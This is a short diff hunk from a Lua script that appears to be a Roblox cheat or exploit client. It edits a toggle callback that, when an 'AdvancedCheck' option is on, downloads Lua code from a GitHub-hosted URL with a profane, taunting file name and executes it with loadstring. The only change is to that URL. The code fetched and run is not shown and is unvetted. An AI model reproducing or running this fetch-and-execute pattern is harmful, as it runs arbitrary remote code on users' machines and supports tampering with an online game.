@@ -2574,7 +2574,7 @@ run(function()
 		Function = function(callback)
 			if callback then
 	            if AdvancedCheck.Enabled then
-				    loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/indeedyouwatchthisfilefuckyou.lua'))()
+				    loadstring(Game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791.github.io/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
 	            end
 			end
 		end,
